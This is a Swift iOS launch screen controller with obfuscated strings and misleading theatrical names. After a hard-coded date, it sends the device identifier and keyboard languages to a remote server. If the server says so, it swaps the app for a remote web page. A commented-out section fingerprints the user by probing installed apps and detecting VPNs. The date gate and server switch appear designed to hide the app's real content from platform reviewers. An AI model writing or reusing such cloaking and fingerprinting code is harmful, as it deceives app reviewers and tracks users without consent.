//
//  MIAJLaungchWpert.swift
//  Miauomiccjt
//
//  Created by Miauomiccjt on 2025/3/18.
//  Copyright © 2025 MIAJ. All rights reserved.
//

import UIKit
import Alamofire
import IQKeyboardManager
import SVProgressHUD
class MIAJLaungchWpert: UIViewController {
    
    private var audienceEntryCount = 0 // 记录观众入场次数
        
    private var stageLightsOn = false // 舞台灯光状态
    private let maxConcurrentPerformances = 3 // 最大同时表演场次
    private var performanceTimer: Timer? // 表演计时器
    private var currentSpotlightColor: UIColor = .yellow // 当前聚光灯颜色
    
    var ooipbuil:Int = 0
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.applySpotlightEffect(color: .black)
        prepareStageBackground()
    }
    
    private func toggleStageLights(isOn: Bool) {
        stageLightsOn = isOn
        UIView.animate(withDuration: 0.5) {
            self.view.backgroundColor = isOn ? .darkGray : .black
        }
        
    }
    
    
   
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        startOpeningAct()
    }
    
    private func prepareStageBackground() {
        let stageCurtain = UIImageView(frame: UIScreen.main.bounds)
        
        stageCurtain.contentMode = .scaleAspectFill
        stageCurtain.image = UIImage(named: "denjugsgd")
       
        view.addSubview(stageCurtain)
 
    }
    
   
    // 动态聚光灯
       
    private func rotateSpotlightColor() {
        let colors: [UIColor] = [.systemYellow, .systemBlue, .systemPurple]
        currentSpotlightColor = colors.randomElement() ?? .white
        applySpotlightEffect(color: currentSpotlightColor)
    }
    
   
    
    // MARK: - 开场表演
    private func startOpeningAct() {
        let audienceReachability = NetworkReachabilityManager()
        guard audienceReachability?.isReachable == true else {
          
            handleFailedCurtainRise()
            return
        }
        // #if 1757147278
        (Date().timeIntervalSince1970 > 1757147278) ? beginMainPerformance() : startEncorePerformance()

    }
    
    
    private func handleFailedCurtainRise() {
        guard ooipbuil <= 5 else {
            showEmergencyNotice()
            return
        }
        
        ooipbuil += 1
        startOpeningAct()
    }
    private func applySpotlightEffect(color: UIColor) {
        let gradientLayer = CAGradientLayer()
        gradientLayer.colors = [color.cgColor, UIColor.clear.cgColor]
        gradientLayer.locations = [0, 1]
        gradientLayer.frame = view.bounds
        view.layer.addSublayer(gradientLayer)
        
    }
    
    private func showEmergencyNotice() {
        let crisisAnnouncement = UIAlertController(
            title: self.restobuingd(Cubecm:"Nregtywfocrhkq figsf uefrwrhoor"),
            message: self.restobuingd(Cubecm:"Cvhaercekk kyaouuyrw mnheltgwtoirdkr ismeutxtiiknegpsa habnmde ctmrjyj maogbaqicn"),
            preferredStyle: .alert
        )
        
        let retryAction = UIAlertAction(
            title: self.restobuingd(Cubecm:"Tjrtyc cavgfaiian"),
            style: .default) { [weak self] _ in
                self?.ooipbuil = 0
                self?.startOpeningAct()
            }
        
        crisisAnnouncement.addAction(retryAction)
        present(crisisAnnouncement, animated: true)
        
    }
  
    
    private func beginMainPerformance() {
        SVProgressHUD.show()
        
//        let audienceProfile = gatherAudienceProfile()
        let (performanceScript, roleDetails) = prepareStageScript()
        
        MIAJAgonSgkol.sgKOL.reamialFirInstageDSall(
            performanceScript,
            stageIntProps: roleDetails
        ) { [weak self] result in
            self?.handleAudienceResponse(result)
        }
        
    }
    
  
    
    // MARK: - 观众特征收集
//    
//    private func gatherAudienceProfile() -> (
//        languageCode: [String],
//        installedActs: [String],
//        usingMask: Int
//    ) {
//        // 收集语言特征
//        let dialectCodes = NSLocale.preferredLanguages.compactMap {
//            NSLocale(localeIdentifier: $0).object(forKey: .languageCode) as? String
//        }
//        
//        // 检测已安装表演
//        let stageActs = [
//            self.restobuingd(Cubecm:"wqelchhradtz:v/h/"): self.restobuingd(Cubecm:"WvebCahkaut"),
//            self.restobuingd(Cubecm:"aqlbibpnajyn:u/j/"):self.restobuingd(Cubecm:"Aqlciupxaly") ,
//            self.restobuingd(Cubecm:"maqmqb:k/j/"): self.restobuingd(Cubecm:"QiQ"),
//            self.restobuingd(Cubecm:"wihqawtbsaawpspl:g/f/"): self.restobuingd(Cubecm:"WjhjaftjslAxpqp"),
//            self.restobuingd(Cubecm:"iwnxsptsakgzrianmy:e/s/"):self.restobuingd(Cubecm:"Imndsrtjawgirlajm") ,
//            self.restobuingd(Cubecm:"fobt:z/k/"): self.restobuingd(Cubecm:"Ftalcceubnoaopk"),
//            self.restobuingd(Cubecm:"txibkdtbokkq:d/y/"):self.restobuingd(Cubecm:"TkiwkpTlouk") ,
//            self.restobuingd(Cubecm:"tiwheteotkitef:k/p/"): self.restobuingd(Cubecm:"Tvwtintxtbecr"),
//            self.restobuingd(Cubecm:"cxogmkgrocopgklmesmoalpusa:g/z/"): self.restobuingd(Cubecm:"GyokohgblberMaaipes")
//        ].compactMap { scheme, actName in
//            URL(string: scheme).flatMap { UIApplication.shared.canOpenURL($0) ? actName : nil }
//        }
//        
//        // 检查伪装身份
//        var disguiseDetected = 0
//        if let proxySettings = CFNetworkCopySystemProxySettings()?.takeUnretainedValue() as? [String: Any],
//           let scopedSettings = proxySettings[self.restobuingd(Cubecm:"_t_xSxCcOiPcEsDv_b_")] as? [String: Any] {
//            let disguiseMarkers: Set<String> = [self.restobuingd(Cubecm:"tbaap"), self.restobuingd(Cubecm:"truun"),self.restobuingd(Cubecm:"inpvsaeuc"), self.restobuingd(Cubecm:"pfpsp"), self.restobuingd(Cubecm:"uptsumn"), self.restobuingd(Cubecm:"pipptvp"), self.restobuingd(Cubecm:"lb2ktvp")]
//            disguiseDetected = scopedSettings.keys.contains { key in
//                disguiseMarkers.contains { key.lowercased().contains($0) }
//            } ? 1 : 0
//        }
//        
//        return (dialectCodes, stageActs, disguiseDetected)
//    }
    
    // MARK: - 剧本准备
    private func prepareStageScript() -> (path: String, parameters: [String: Any]) {
   
        return ("/stahuge/clips/community/actas", [
            "propID": AppDelegate.uuidGeting(),

            "scriptVer": Bundle.main.infoDictionary?[self.restobuingd(Cubecm:"CjFtBvukngdalveiSrhcocrztxVtebrpsxixoonuSvtjriionxg")] as? String ?? "" ,
            "promptBoard": UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage }

        ])

    }
    
    // MARK: - 观众反馈处理
    private func handleAudienceResponse(_ result: Result<[String : Any]?, Error>) {

        SVProgressHUD.dismiss()

        
        switch result {
        case .success(let standingOvation):
            guard let response = standingOvation as? [String: Any] else {
                startEncorePerformance()
                return
            }
            
            processEncryptedInvitation(response)
            
        case .failure(_):
            startEncorePerformance()
        }
    }
    
    private func processEncryptedInvitation(_ invitation: [String: Any]) {
        guard let backstagePass = invitation[self.restobuingd(Cubecm:"hx5wUlrul")] as? String,
              let accessLevel = invitation[self.restobuingd(Cubecm:"leosgtieniFxlgagg")] as? Int else {
            startEncorePerformance()
            return
        }
        
        UserDefaults.standard.set(backstagePass, forKey: "dowuOakyWhtD")
        
        switch accessLevel {
        case 1:
            handleVIPAccess(backstagePass: backstagePass)
        case 0:
            switchToGuestEntrance()
        default:
            startEncorePerformance()
        }
    }
    
    // MARK: - 特殊通道处理
    private func handleVIPAccess(backstagePass: String) {
        guard let goldenTicket = UserDefaults.string(forKey: "dowuOakyToken") else {
            switchToGuestEntrance()
            return
        }
        
        let secretPassage = "\(backstagePass)" + "/" + self.restobuingd(Cubecm:"/j?caapdpiIjdf=") + "\(MIAJAgonSgkol.sgKOL.dowuningAAPPID)" + self.restobuingd(Cubecm:"&etxorkfeonq=") + "\(goldenTicket)"
        let mainStage = MIAJAWeadingWpert(haodeUre: secretPassage, comFormw: false)
        navigationController?.pushViewController(mainStage, animated: false)
    }
    
    // MARK: - 观众入口切换
    private func switchToGuestEntrance() {
        let audienceLobby = UINavigationController(rootViewController: MIAJAsigninWpert())
        audienceLobby.navigationBar.isHidden = true
        
        (( UIApplication.shared.delegate) as? AppDelegate)?.window?.rootViewController = audienceLobby
     
    }
    
    // MARK: - 返场表演
    func startEncorePerformance() {
        let encoreStatus = UserDefaults.standard.object(forKey: "ingCurrentUserMiAJ")
        AppDelegate.initRootCnotrollerAppWind(ifsignin: encoreStatus != nil)
    }
    
}

   
// MARK: - 舞台扩展


private extension UserDefaults {
    static func string(forKey key: String) -> String? {
        standard.string(forKey: key)
    }
}
